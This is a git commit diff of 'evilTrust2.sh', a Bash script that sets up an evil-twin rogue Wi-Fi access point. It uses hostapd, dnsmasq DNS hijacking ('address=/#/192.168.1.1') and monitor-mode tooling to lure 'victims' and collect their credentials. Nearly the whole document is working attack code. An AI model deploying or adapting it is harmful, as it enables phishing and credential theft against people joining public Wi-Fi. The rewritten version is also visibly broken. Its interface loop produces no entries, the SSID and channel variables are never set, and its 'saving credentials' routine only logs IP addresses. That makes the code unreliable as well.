2a0387c398c1250f029b87e7b14c424802ddcd90
W r e n c h <134978254+Jeanpseven@users.noreply.github.com>
2023-12-26 19:18:11 -0300

    Update evilTrust2.sh

--- evilTrust2.sh
+++ evilTrust2.sh
@@ -3,127 +3,104 @@
 trap ctrl_c INT
 
 function ctrl_c(){
-    echo -e "\n\n[*] Saindo...\n"
-    cleanup
-    exit 0
+        echo -e "\n\n[*] Saindo...\n"
+        cleanup
+        exit 0
 }
 
 function cleanup(){
-    rm -f dnsmasq.conf hostapd.conf 2>/dev/null
-    rm -rf iface 2>/dev/null
-    rm -f credenciais.txt 2>/dev/null
-    iptables --flush
-    iptables --table nat --flush
-    iptables --delete-chain
-    iptables --table nat --delete-chain
+        echo -e "[*] Limpando configurações antigas..."
+        rm dnsmasq.conf hostapd.conf 2>/dev/null
+        rm -r iface 2>/dev/null
+        find \-name datos-privados.txt | xargs rm 2>/dev/null
+        sleep 3
+        ifconfig wlan0mon down 2>/dev/null
+        sleep 1
+        iwconfig wlan0mon mode monitor 2>/dev/null
+        sleep 1
+        ifconfig wlan0mon up 2>/dev/null
+        airmon-ng stop wlan0mon > /dev/null 2>&1
+        sleep 1
+        tput cnorm
+        service network-manager restart
 }
 
 function banner(){
-    echo -e "\n[*] Iniciando o evilTrust..."
-    sleep 0.05
+    echo -e "\n[evilTrust v2.0 - Autor: @s4vitar (Marcelo Vázquez)]"
 }
 
-function dependencies(){
-    counter=0
-    dependencias=(php dnsmasq hostapd)
-
-    for programa in "${dependencias[@]}"; do
-        if [ "$(command -v $programa)" ]; then
-            let counter+=1
-        fi
-    done
-
-    if [ "$counter" -eq 3 ]; then
-        echo -e "\n[*] Iniciando...\n"
-        sleep 3
-    else
-        echo -e "\n[!] É necessário ter as ferramentas php, dnsmasq e hostapd instaladas para executar este script\n"
-        exit 1
-    fi
-}
-
-function getCredentials(){
-    activeHosts=0
-    while true; do
-        echo -e "\n[*] Aguardando credenciais (Ctrl+C para sair)...\n"
-        echo -e "Vítimas conectadas: $activeHosts\n"
-        find -name credenciais.txt | xargs cat 2>/dev/null
-        activeHosts=$(bash utilities/hostsCheck.sh | grep -v "192.168.1.1 " | wc -l)
-        sleep 3
-        clear
-    done
-}
-
-function startAttack(){
-    clear
-    if [[ -e credenciais.txt ]]; then
-        rm -rf credenciais.txt
-    fi
-
-    echo -e "\n[*] Listando interfaces de rede disponíveis..."
-    airmon-ng start wlan0 > /dev/null 2>&1
-    interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs)
-    choosed_interface=""
+function listInterfaces(){
+    echo -e "\n[*] Listando interfaces disponíveis:\n"
     counter=1
-
-    for interface in $interface; do
+    for interface in $(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface); do
+        echo -e "\t$counter. $interface"
         let counter++
     done
+    rm iface 2>/dev/null
+}
 
+function chooseInterface(){
     checker=0
     while [ $checker -ne 1 ]; do
-        echo -ne "\n[*] Nome da interface (Ex: wlan0mon): " && read choosed_interface
+        echo -ne "\n[*] Escolha o número da interface que aceita o modo monitor: "
+        read -r interface_number
 
-        for interface in $interface; do
-            if [ "$choosed_interface" == "$interface" ]; then
-                checker=1
-            fi
-        done
-
-        if [ $checker -eq 0 ]; then
-            echo -e "\n[!] A interface fornecida não existe"
+        if [ "$interface_number" -ge 1 ] && [ "$interface_number" -le "$counter" ]; then
+            choosed_interface=$(sed -n "${interface_number}p" iface)
+            checker=1
+        else
+            echo -e "\n[!] Número de interface inválido."
         fi
     done
+}
 
-    rm iface 2>/dev/null
-    echo -ne "\n[*] Nome do ponto de acesso a ser utilizado (Ex: wifiGratis): " && read -r use_ssid
-    echo -ne "[*] Canal a ser utilizado (1-12): " && read use_channel
-    echo -e "\n[!] Finalizando todas as conexões...\n"
-    sleep 2
+function configureAttack(){
+    echo -e "\n[*] Configurando a interface $choosed_interface em modo monitor..."
+    airmon-ng start "$choosed_interface" > /dev/null 2>&1
+    choosed_interface="${choosed_interface}mon"
+
+    echo -e "[*] Desativando network-manager, hostapd, dnsmasq, wpa_supplicant e dhcpd..."
     killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
     sleep 5
 
-    echo -e "interface=$choosed_interface\n" > hostapd.conf
-    echo -e "driver=nl80211\n" >> hostapd.conf
-    echo -e "ssid=$use_ssid\n" >> hostapd.conf
-    echo -e "hw_mode=g\n" >> hostapd.conf
-    echo -e "channel=$use_channel\n" >> hostapd.conf
-    echo -e "macaddr_acl=0\n" >> hostapd.conf
-    echo -e "auth_algs=1\n" >> hostapd.conf
-    echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
+    echo -e "[*] Configurando hostapd..."
+    configureHostapd
 
-    echo -e "[*] Configurando interface $choosed_interface\n"
-    sleep 2
-    echo -e "[*] Iniciando hostapd..."
-    hostapd hostapd.conf > /dev/null 2>&1 &
-    sleep 6
+    echo -e "[*] Configurando dnsmasq..."
+    configureDnsmasq
 
-    echo -e "\n[*] Configurando dnsmasq..."
-    echo -e "interface=$choosed_interface\n" > dnsmasq.conf
-    echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
-    echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
-    echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
-    echo -e "server=8.8.8.8\n" >> dnsmasq.conf
-    echo -e "log-queries\n" >> dnsmasq.conf
-    echo -e "log-dhcp\n" >> dnsmasq.conf
-    echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
-    echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
+    echo -e "[*] Iniciando EvilTrust..."
+    startEvilTrust
+}
 
-    ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
-    sleep 1
+function configureHostapd(){
+    echo -e "interface=$choosed_interface\n
+driver=nl80211\n
+ssid=$use_ssid\n
+hw_mode=g\n
+channel=$use_channel\n
+macaddr_acl=0\n
+auth_algs=1\n
+ignore_broadcast_ssid=0" > hostapd.conf
+
+    echo -e "[*] Configurando interface $choosed_interface"
+    ifconfig "$choosed_interface" up 192.168.1.1 netmask 255.255.255.0
     route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
-    sleep 1
+}
 
+function configureDnsmasq(){
+    echo -e "interface=$choosed_interface\n
+dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n
+dhcp-option=3,192.168.1.1\n
+dhcp-option=6,192.168.1.1\n
+server=8.8.8.8\n
+log-queries\n
+log-dhcp\n
+listen-address=127.0.0.1\n
+address=/#/192.168.1.1" > dnsmasq.conf
+}
+
+function startEvilTrust(){
     echo -e "[*] Iniciando dnsmasq..."
     dnsmasq -C dnsmasq.conf > /dev/null 2>&1 &
     sleep 2
@@ -143,7 +120,36 @@ function startAttack(){
     getCredentials
 }
 
-cleanup
+function getCredentials(){
+    activeHosts=0
+    while true; do
+        echo -e "\n[*] Esperando credenciais (Pressione Ctrl+C para finalizar)...\n"
+        for i in $(cat /proc/net/arp | grep -v "IP" | awk '{print $1}'); do
+            if [ -e "datos-privados.txt" ]; then
+                knownHosts=$(cat datos-privados.txt | grep -v "IP" | awk '{print $1}')
+                if [[ "$knownHosts" != *"$i"* ]]; then
+                    echo "[*] Nova vítima encontrada: $i"
+                    echo "[*] Salvando credenciais..."
+                    echo -e "\n$i" >> datos-privados.txt
+                    echo "[*] Credenciais salvas em datos-privados.txt\n"
+                    activeHosts=1
+                fi
+            else
+                echo -e "\n[i] Criando arquivo para salvar credenciais..."
+                echo -e "\n$i" > datos-privados.txt
+            fi
+        done
+
+        if [ "$activeHosts" -eq 0 ]; then
+            echo -e "\n[i] Nenhuma nova vítima encontrada..."
+        fi
+
+        sleep 10
+    done
+}
+
+# Main execution starts here
 banner
-dependencies
-startAttack
+listInterfaces
+chooseInterface
+configureAttack
